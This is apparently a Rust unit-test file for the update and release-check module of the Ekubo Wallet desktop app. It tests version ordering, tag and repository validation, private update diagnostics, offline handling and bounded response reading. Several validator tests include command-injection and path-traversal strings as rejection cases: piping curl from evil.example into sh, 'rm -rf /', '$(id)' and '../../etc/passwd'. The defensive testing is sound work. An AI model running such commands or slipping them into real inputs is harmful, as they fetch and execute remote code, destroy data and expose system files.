//! Tests for [`super`].
//!
//! Out of line so the audit corpus is production code: V12 bills measured
//! bytes and excludes `*_test.rs` by default.

use super::*;

const REPOSITORY: &str = "EkuboProtocol/wallet";

#[cfg(target_os = "macos")]
#[test]
fn macos_relaunch_forces_a_new_instance() {
    let application = Path::new("/Applications/Ekubo Wallet.app");
    let command = macos_relaunch_command(application);

    assert_eq!(command.get_program(), "/usr/bin/open");
    assert_eq!(
        command.get_args().collect::<Vec<_>>(),
        vec![std::ffi::OsStr::new("-n"), application.as_os_str()]
    );
}

#[test]
fn update_diagnostics_are_private_durable_and_single_line() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    record_update_diagnostic(
        directory.path(),
        "failed\nwith\ra control\u{0007} character",
    )
    .expect("the diagnostic is written");

    let path = update_diagnostics_path(directory.path());
    let text = std::fs::read_to_string(&path).expect("the diagnostic remains readable");
    assert_eq!(text.lines().count(), 1);
    assert!(text.contains("wallet="));
    assert!(text.contains("failed with a control  character"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        assert_eq!(
            std::fs::metadata(path).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }
}

#[test]
fn core_and_desktop_package_versions_cannot_drift() {
    assert_eq!(
        ekubo_wallet_core::update_trust::PACKAGE_VERSION_MARKER,
        format!("\0EKUBO-WALLET-PACKAGE-VERSION:{}\0", crate::VERSION)
    );
}

fn at(text: &str) -> DateTime<Utc> {
    text.parse().expect("a fixed timestamp")
}

/// The check with no network and a fixed clock. `fetch` is what the endpoint
/// would have answered.
async fn check_at(installed: &str, now: DateTime<Utc>, fetch: Option<&str>) -> ReleaseCheck {
    let fetch = fetch.map(str::to_string);
    check_with(installed, REPOSITORY, now, false, || async { fetch }).await
}

#[test]
fn a_published_release_supersedes_an_older_one() {
    assert_eq!(is_newer("1.4.2", "v1.5.0"), Some(true));
    assert_eq!(is_newer("1.4.2", "v1.4.3"), Some(true));
    assert_eq!(is_newer("1.4.2", "v2.0.0"), Some(true));
    assert_eq!(is_newer("1.4.2", "v1.4.2"), Some(false));
    assert_eq!(is_newer("1.5.0", "v1.4.2"), Some(false));
    // Shorter cores compare as if zero-padded, so `1.5` is not behind `1.5.0`.
    assert_eq!(is_newer("1.5", "v1.5.0"), Some(false));
    assert_eq!(is_newer("1.5", "v1.5.1"), Some(true));
}

#[test]
fn a_release_supersedes_a_prerelease_of_itself() {
    // The case that matters while `BUILD_VERSION` is an `-rc` build: the
    // numeric cores are equal and the running build is still behind.
    assert_eq!(is_newer("1.0.0-rc.0+8133a00", "v1.0.0"), Some(true));
    assert_eq!(is_newer("1.0.0-rc.0+8133a00", "v1.0.0-rc.0"), Some(false));
    assert_eq!(is_newer("1.0.0", "v1.0.0-rc.1"), Some(false));
}

#[test]
fn an_unparseable_version_is_unknown_rather_than_an_upgrade() {
    // Never `Some(true)`: an answer nobody can order must not become a
    // recommendation to install something.
    assert_eq!(is_newer("1.4.2", "nightly"), None);
    assert_eq!(is_newer("not-a-version", "v1.5.0"), None);
    assert_eq!(is_newer("1.4.2", ""), None);
}

#[test]
fn a_tag_that_could_escape_a_release_url_is_refused() {
    // A tag is only ever alphanumerics and version punctuation.
    assert!(!valid_tag("v1.0.0; curl evil.example | sh"));
    assert!(!valid_tag("v1.0.0 && rm -rf /"));
    assert!(!valid_tag("v1.0.0\nrm -rf /"));
    assert!(!valid_tag("$(id)"));
    assert!(!valid_tag("`id`"));
    assert!(!valid_tag("../../etc/passwd"));
    assert!(!valid_tag(""));
    assert!(!valid_tag(&"v1.0.0".repeat(20)));

    assert!(valid_tag("v1.0.0"));
    assert!(valid_tag("v1.0.0-rc.1"));
    assert!(valid_tag("1.0.0+8133a00"));
}

#[test]
fn a_repository_override_is_owner_and_name_only() {
    assert!(valid_repository("EkuboProtocol/wallet"));
    assert!(valid_repository("owner/name.with.dots"));

    assert!(!valid_repository("EkuboProtocol"));
    assert!(!valid_repository("owner/name/extra"));
    assert!(!valid_repository("owner/"));
    assert!(!valid_repository("/name"));
    assert!(!valid_repository("owner/name; id"));
    assert!(!valid_repository("../../../etc"));
}

#[tokio::test]
async fn an_available_update_directs_the_user_to_the_verified_updater() {
    let check = check_at("1.4.2", at("2026-08-08T00:00:00Z"), Some("v1.5.0")).await;

    assert!(check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
    assert_eq!(check.source, CheckSource::Network);
    assert_eq!(
        check.release_url.as_deref(),
        Some("https://github.com/EkuboProtocol/wallet/releases/latest")
    );
    assert!(check.instruction.contains("Updates"));
    assert!(check.instruction.contains("download, verify, and install"));
    assert!(check.notice().is_some());
}

#[tokio::test]
async fn a_current_build_offers_no_notice() {
    let check = check_at("1.5.0", at("2026-08-08T00:00:00Z"), Some("v1.5.0")).await;

    assert!(!check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
    assert!(check.notice().is_none());
}

#[tokio::test]
async fn a_malicious_tag_is_discarded_rather_than_interpolated() {
    let check = check_at(
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0; curl evil.example | sh"),
    )
    .await;

    assert!(!check.update_available);
    assert!(check.latest_version.is_none());
}

#[tokio::test]
async fn every_check_asks_the_endpoint_for_the_latest_release() {
    let first = check_at("1.4.2", at("2026-08-08T00:00:00Z"), Some("v1.5.0")).await;
    assert_eq!(first.source, CheckSource::Network);

    // A later explicit check must use the endpoint's newer answer rather than
    // preserve the first one in process or on disk.
    let second = check_with(
        "1.4.2",
        REPOSITORY,
        at("2026-08-08T01:00:00Z"),
        false,
        || async { Some("v1.6.0".to_string()) },
    )
    .await;

    assert_eq!(second.source, CheckSource::Network);
    assert_eq!(second.latest_version.as_deref(), Some("v1.6.0"));
    assert_eq!(second.checked_at, Some(at("2026-08-08T01:00:00Z")));
}

#[test]
fn release_checks_have_no_persistent_tag_cache() {
    let source = include_str!("release_check.rs");
    assert!(!source.contains("release-check.json"));
    assert!(!source.contains("read_cache"));
    assert!(!source.contains("write_cache"));
    assert!(!source.contains("CACHE_TTL"));
}

#[tokio::test]
async fn being_offline_is_not_an_error() {
    let check = check_at("1.4.2", at("2026-08-08T00:00:00Z"), None).await;

    assert_eq!(check.source, CheckSource::Unavailable);
    assert!(!check.update_available);
    assert!(check.latest_version.is_none());
    assert!(check.notice().is_none());
    // The agent is told explicitly not to read this as a reason to upgrade.
    assert!(check.instruction.contains("Do not retry"));
}

#[tokio::test]
async fn the_environment_can_turn_the_check_off_entirely() {
    let check = check_with(
        "1.4.2",
        REPOSITORY,
        at("2026-08-08T00:00:00Z"),
        true,
        || async { panic!("a disabled check must not reach the endpoint") },
    )
    .await;

    assert_eq!(check.source, CheckSource::Disabled);
    assert!(!check.update_available);
    assert!(check.notice().is_none());
}

mod bounded_body_tests {
    //! `content_length` is a courtesy the server extends, not a fact.

    /// The header check refuses the honest oversized case before a byte is
    /// read, which is worth keeping. It says nothing about a server that omits
    /// the header -- chunked encoding does -- or states one length and sends
    /// another, and `text()` then buffered whatever arrived.
    ///
    /// Read from the source because standing up a lying HTTP server for a
    /// best-effort update check is a great deal of machinery for one loop.
    /// What is checkable is that the body is accumulated against the ceiling
    /// rather than handed to `text()`.
    #[test]
    fn the_body_is_read_against_the_ceiling_rather_than_buffered() {
        let source = include_str!("release_check.rs");
        let fetch = source
            .split_once("async fn fetch_latest_tag")
            .expect("the fetch exists")
            .1;
        let body = fetch.split_once("\n}").expect("its body ends").0;
        assert!(
            !body.contains(".text().await"),
            "an unbounded read is what this replaced"
        );
        assert!(
            body.contains("bounded_body(response)"),
            "the body goes through the ceiling"
        );

        let bounded = source
            .split_once("async fn bounded_body")
            .expect("the helper exists")
            .1;
        assert!(
            bounded.contains("MAX_RESPONSE_BYTES"),
            "and the ceiling is the one already declared for this"
        );
        assert!(
            bounded.contains("return None"),
            "an oversized body is abandoned rather than truncated: a partial \
             JSON document is not a release"
        );
    }
}
